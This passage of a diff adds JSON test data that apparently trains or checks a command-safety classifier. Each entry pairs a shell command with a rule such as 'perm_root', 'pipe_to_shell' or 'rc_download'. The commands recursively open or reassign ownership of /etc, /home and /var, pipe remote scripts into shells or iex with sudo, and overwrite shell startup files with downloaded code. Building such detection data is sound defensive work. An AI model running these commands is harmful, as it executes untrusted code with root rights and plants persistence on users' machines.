+   "cmd": "sudo chmod -R 777 ~/*",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chmod -R a+rwx /etc",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chmod -R a+rwx /home",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chmod -R a+rwx /var",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chmod -Rf 777 /etc",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chmod -Rf 777 /home",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chmod -Rf 777 /var",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chown -R $USER:$USER /etc",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chown -R $USER:$USER /home",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chown -R $USER:$USER /var",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chown -R 1000:1000 /etc",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chown -R 1000:1000 /home",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chown -R 1000:1000 /var",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chown -R nobody /etc",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chown -R nobody /home",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chown -R nobody /var",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chown -R root:root /etc",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chown -R root:root /home",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chown -R root:root /var",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "(New-Object System.Net.WebClient).DownloadString('https://192.0.2.10/v2/install.sh') | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "(New-Object System.Net.WebClient).DownloadString('https://198.51.100.7/run.sh') | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "(New-Object System.Net.WebClient).DownloadString('https://203.0.113.5:8080/install') | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "(New-Object System.Net.WebClient).DownloadString('https://cdn.example.test/v2/install.sh') | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "(New-Object System.Net.WebClient).DownloadString('https://dl.example.com/run.sh') | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "(New-Object System.Net.WebClient).DownloadString('https://example.com/bootstrap') | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "(New-Object System.Net.WebClient).DownloadString('https://get.example.com/install') | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "(New-Object System.Net.WebClient).DownloadString('https://install.example.test/install') | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "(New-Object System.Net.WebClient).DownloadString('https://scripts.example.invalid/run.sh') | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "Invoke-WebRequest -UseBasicParsing https://192.0.2.10/v2/install.sh | Invoke-Expression",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "Invoke-WebRequest -UseBasicParsing https://198.51.100.7/run.sh | Invoke-Expression",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "Invoke-WebRequest -UseBasicParsing https://203.0.113.5:8080/install | Invoke-Expression",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "Invoke-WebRequest -UseBasicParsing https://cdn.example.test/v2/install.sh | Invoke-Expression",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "Invoke-WebRequest -UseBasicParsing https://dl.example.com/run.sh | Invoke-Expression",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "Invoke-WebRequest -UseBasicParsing https://example.com/bootstrap | Invoke-Expression",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "Invoke-WebRequest -UseBasicParsing https://get.example.com/install | Invoke-Expression",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "Invoke-WebRequest -UseBasicParsing https://install.example.test/install | Invoke-Expression",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "Invoke-WebRequest -UseBasicParsing https://scripts.example.invalid/run.sh | Invoke-Expression",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "bash -c \"$(curl -fsSL https://192.0.2.10/get)\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "bash -c \"$(curl -s https://dl.example.com/setup.sh)\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "bash -c \"$(wget -qO- https://install.example.test/setup.sh)\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "bash -c \"curl -fsSL https://dl.example.com/v2/install.sh | sh\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "bash -c \"curl -s https://get.example.com/bootstrap | sh\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "bash -c \"wget -qO- https://203.0.113.5:8080/install | sh\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "bash <(curl -fsSL https://cdn.example.test/v2/install.sh)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "bash <(curl -s https://get.example.com/install)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "bash <(wget -qO- https://dl.example.com/run.sh)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "cd /tmp && curl -fsSL https://192.0.2.10/run.sh | sudo bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "cd /tmp && curl -s https://example.com/setup.sh | sudo bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "cd /tmp && wget -qO- https://dl.example.com/get | sudo bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -L https://get.example.com/bootstrap | zsh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -L https://get.example.com/run.sh | dash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -L https://install.example.test/install | bash -s -- --yes",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -L https://install.example.test/run.sh | sudo bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -L https://scripts.example.invalid/install | bash -",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -fsSL --proto \"=https\" https://192.0.2.10/get | sudo bash -s --",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -fsSL --proto \"=https\" https://192.0.2.10/v2/install.sh | sh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -fsSL --proto \"=https\" https://192.0.2.10/v2/install.sh | sh -s",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -fsSL --proto \"=https\" https://198.51.100.7/install.sh | dash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -fsSL --proto \"=https\" https://203.0.113.5:8080/setup.sh | sudo bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -fsSL --proto \"=https\" https://203.0.113.5:8080/v2/install.sh | sudo -E bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -fsSL --proto \"=https\" https://dl.example.com/bootstrap | zsh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -fsSL --proto \"=https\" https://dl.example.com/v2/install.sh | bash -",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -fsSL --proto \"=https\" https://example.com/v2/install.sh | sudo sh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -fsSL https://192.0.2.10/install.sh | sudo bash -s --",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -fsSL https://198.51.100.7/setup.sh | sudo -E bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -fsSL https://203.0.113.5:8080/bootstrap 2>&1 | bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -fsSL https://203.0.113.5:8080/bootstrap | zsh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -fsSL https://203.0.113.5:8080/v2/install.sh | sudo sh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -fsSL https://cdn.example.test/get | sh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -fsSL https://dl.example.com/bootstrap | bash -s -- --yes",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -fsSL https://install.example.test/get | bash -",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -fsSL https://install.example.test/run.sh | bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -fsSL https://scripts.example.invalid/install 2>/dev/null | sh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -s https://198.51.100.7/get | bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -s https://cdn.example.test/v2/install.sh | bash -s -- --yes",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -s https://dl.example.com/install | zsh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -s https://example.com/bootstrap | sudo bash -s --",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -s https://example.com/get 2>/dev/null | sh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -s https://get.example.com/get | sh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -s https://install.example.test/bootstrap | bash -",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -s https://install.example.test/get | sudo sh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -s https://install.example.test/setup.sh 2>&1 | bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -sSL https://cdn.example.test/run.sh | sh -s",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -sSL https://dl.example.com/get | sudo bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -sSL https://install.example.test/run.sh | bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -sSL https://install.example.test/v2/install.sh | dash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl -sSL https://scripts.example.invalid/setup.sh | sudo sh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl https://192.0.2.10/get | sh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl https://198.51.100.7/run.sh | bash -s -- --yes",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl https://203.0.113.5:8080/v2/install.sh | dash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl https://dl.example.com/bootstrap | bash -",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl https://dl.example.com/v2/install.sh | sudo sh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl https://example.com/run.sh | sudo -E bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl https://get.example.com/install.sh | sudo bash -s --",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "eval \"$(curl -fsSL https://install.example.test/install)\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "eval \"$(curl -s https://example.com/get)\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "eval \"$(wget -qO- https://get.example.com/install.sh)\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "eval $(curl -fsSL https://203.0.113.5:8080/install)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "eval $(curl -s https://dl.example.com/install)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "eval $(wget -qO- https://198.51.100.7/install)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iex ((New-Object Net.WebClient).DownloadString('https://192.0.2.10/v2/install.sh'))",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iex ((New-Object Net.WebClient).DownloadString('https://198.51.100.7/run.sh'))",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iex ((New-Object Net.WebClient).DownloadString('https://203.0.113.5:8080/install'))",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iex ((New-Object Net.WebClient).DownloadString('https://cdn.example.test/v2/install.sh'))",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iex ((New-Object Net.WebClient).DownloadString('https://dl.example.com/run.sh'))",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iex ((New-Object Net.WebClient).DownloadString('https://example.com/bootstrap'))",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iex ((New-Object Net.WebClient).DownloadString('https://get.example.com/install'))",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iex ((New-Object Net.WebClient).DownloadString('https://install.example.test/install'))",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iex ((New-Object Net.WebClient).DownloadString('https://scripts.example.invalid/run.sh'))",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iex (iwr https://192.0.2.10/v2/install.sh)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iex (iwr https://198.51.100.7/run.sh)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iex (iwr https://203.0.113.5:8080/install)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iex (iwr https://cdn.example.test/v2/install.sh)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iex (iwr https://dl.example.com/run.sh)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iex (iwr https://example.com/bootstrap)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iex (iwr https://get.example.com/install)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iex (iwr https://install.example.test/install)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iex (iwr https://scripts.example.invalid/run.sh)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "irm https://192.0.2.10/v2/install.sh | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "irm https://198.51.100.7/run.sh | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "irm https://203.0.113.5:8080/install | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "irm https://cdn.example.test/v2/install.sh | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "irm https://dl.example.com/run.sh | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "irm https://example.com/bootstrap | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "irm https://get.example.com/install | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "irm https://install.example.test/install | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "irm https://scripts.example.invalid/run.sh | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iwr https://192.0.2.10/v2/install.sh | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iwr https://198.51.100.7/run.sh | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iwr https://203.0.113.5:8080/install | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iwr https://cdn.example.test/v2/install.sh | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iwr https://dl.example.com/run.sh | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iwr https://example.com/bootstrap | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iwr https://get.example.com/install | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iwr https://install.example.test/install | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "iwr https://scripts.example.invalid/run.sh | iex",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "powershell -c \"irm https://192.0.2.10/v2/install.sh | iex\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "powershell -c \"irm https://198.51.100.7/run.sh | iex\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "powershell -c \"irm https://203.0.113.5:8080/install | iex\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "powershell -c \"irm https://cdn.example.test/v2/install.sh | iex\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "powershell -c \"irm https://dl.example.com/run.sh | iex\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "powershell -c \"irm https://example.com/bootstrap | iex\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "powershell -c \"irm https://get.example.com/install | iex\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "powershell -c \"irm https://install.example.test/install | iex\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "powershell -c \"irm https://scripts.example.invalid/run.sh | iex\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "sh -c \"$(curl -fsSL https://get.example.com/v2/install.sh)\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "sh -c \"$(curl -s https://198.51.100.7/install.sh)\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "sh -c \"$(wget -qO- https://scripts.example.invalid/install.sh)\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "sh <(curl -fsSL https://dl.example.com/run.sh)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "sh <(curl -s https://203.0.113.5:8080/get)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "sh <(wget -qO- https://get.example.com/setup.sh)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "source <(curl -fsSL https://198.51.100.7/install.sh)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "source <(curl -s https://dl.example.com/bootstrap)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "source <(wget -qO- https://scripts.example.invalid/run.sh)",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "sudo bash -c \"$(curl -fsSL https://dl.example.com/install)\" -- --yes",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "sudo bash -c \"$(curl -s https://203.0.113.5:8080/setup.sh)\" -- --yes",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "sudo bash -c \"$(wget -qO- https://scripts.example.invalid/bootstrap)\" -- --yes",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "wget -O - https://203.0.113.5:8080/install | zsh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "wget -O - https://203.0.113.5:8080/run.sh | sudo sh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "wget -O - https://cdn.example.test/bootstrap | dash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "wget -O - https://cdn.example.test/bootstrap | sh -s",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "wget -O - https://get.example.com/install | bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "wget -q -O - https://198.51.100.7/install.sh | bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "wget -q -O - https://example.com/get | sudo sh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "wget -q -O - https://get.example.com/install | zsh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "wget -qO- https://203.0.113.5:8080/install.sh | zsh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "wget -qO- https://cdn.example.test/install | sudo bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "wget -qO- https://cdn.example.test/setup.sh | sh -s",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "wget -qO- https://dl.example.com/bootstrap 2>/dev/null | sh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "wget -qO- https://dl.example.com/install | sh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "wget -qO- https://dl.example.com/setup.sh | sudo -E bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "wget -qO- https://scripts.example.invalid/bootstrap | bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "wget -qO- https://scripts.example.invalid/install.sh 2>&1 | bash",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "Invoke-WebRequest https://192.0.2.10/profile.ps1 -OutFile $PROFILE",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "Invoke-WebRequest https://cdn.example.test/profile.ps1 -OutFile $PROFILE",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "Invoke-WebRequest https://dl.example.com/profile.ps1 -OutFile $PROFILE",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "Invoke-WebRequest https://get.example.com/profile.ps1 -OutFile $PROFILE",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "Invoke-WebRequest https://install.example.test/profile.ps1 -OutFile $PROFILE",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "Invoke-WebRequest https://scripts.example.invalid/profile.ps1 -OutFile $PROFILE",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl --output $HOME/.bashrc https://198.51.100.7/run.sh",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl --output $HOME/.zshrc https://install.example.test/setup.sh",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl --output /etc/bash.bashrc https://198.51.100.7/get",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl --output /etc/profile https://198.51.100.7/get",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl --output /home/alice/.bashrc https://203.0.113.5:8080/install",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl --output ~/.bash_profile https://example.com/v2/install.sh",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl --output ~/.bashrc https://scripts.example.invalid/setup.sh",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl --output ~/.config/fish/config.fish https://get.example.com/run.sh",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl --output ~/.profile https://example.com/setup.sh",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl --output ~/.zprofile https://203.0.113.5:8080/run.sh",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl --output ~/.zshrc https://get.example.com/get",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://192.0.2.10/get | tee -a ~/.config/fish/config.fish",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://198.51.100.7/run.sh | tee -a ~/.zshrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://198.51.100.7/setup.sh | tee ~/.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://203.0.113.5:8080/get | tee ~/.zprofile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://203.0.113.5:8080/install | tee -a /etc/profile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://203.0.113.5:8080/install.sh -o /etc/profile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://203.0.113.5:8080/install.sh | tee ~/.bash_profile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://203.0.113.5:8080/run.sh | tee $HOME/.zshrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://203.0.113.5:8080/run.sh | tee /etc/bash.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://cdn.example.test/bootstrap | tee -a ~/.zprofile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://cdn.example.test/install | tee ~/.zshrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://cdn.example.test/run.sh | tee -a $HOME/.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://cdn.example.test/v2/install.sh | tee -a ~/.profile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://dl.example.com/install | tee /etc/profile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://dl.example.com/install.sh | tee $HOME/.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://dl.example.com/install.sh | tee ~/.profile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://dl.example.com/run.sh -o ~/.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://example.com/install.sh | tee -a /etc/bash.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://install.example.test/get | tee -a ~/.bash_profile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://install.example.test/get | tee /home/alice/.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://install.example.test/setup.sh | tee -a $HOME/.zshrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://scripts.example.invalid/install | tee -a /home/alice/.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://scripts.example.invalid/install | tee -a ~/.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -fsSL https://scripts.example.invalid/v2/install.sh | tee ~/.config/fish/config.fish",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://192.0.2.10/bootstrap >> ~/.bash_profile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://192.0.2.10/install -o $HOME/.zshrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://192.0.2.10/v2/install.sh >> /home/alice/.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://198.51.100.7/install.sh >> ~/.zshrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://198.51.100.7/run.sh > $HOME/.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://198.51.100.7/run.sh > /etc/bash.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://198.51.100.7/setup.sh > ~/.zprofile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://cdn.example.test/get > $HOME/.zshrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://cdn.example.test/get >> $HOME/.zshrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://cdn.example.test/install -o ~/.bash_profile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://cdn.example.test/install.sh >> /etc/profile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://cdn.example.test/v2/install.sh > ~/.zshrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://dl.example.com/get > /etc/profile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://dl.example.com/get >> ~/.zprofile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://dl.example.com/install.sh > ~/.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://dl.example.com/install.sh >> $HOME/.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://dl.example.com/run.sh > ~/.config/fish/config.fish",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://example.com/install > /home/alice/.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://example.com/install.sh > ~/.profile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://example.com/run.sh > ~/.bash_profile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://get.example.com/bootstrap >> ~/.config/fish/config.fish",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://install.example.test/install >> ~/.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://scripts.example.invalid/install.sh >> /etc/bash.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://scripts.example.invalid/run.sh -o ~/.profile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -s https://scripts.example.invalid/v2/install.sh >> ~/.profile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -sSL https://203.0.113.5:8080/setup.sh -o ~/.config/fish/config.fish",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -sSL https://cdn.example.test/run.sh -o /home/alice/.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -sSL https://example.com/run.sh -o ~/.zprofile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -sSL https://example.com/setup.sh -o ~/.zshrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -sSL https://install.example.test/setup.sh -o /etc/bash.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl -sSL https://scripts.example.invalid/get -o $HOME/.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "iwr https://192.0.2.10/profile.ps1 -OutFile $PROFILE",
+   "rule": "rc_download"
+  },
+  {
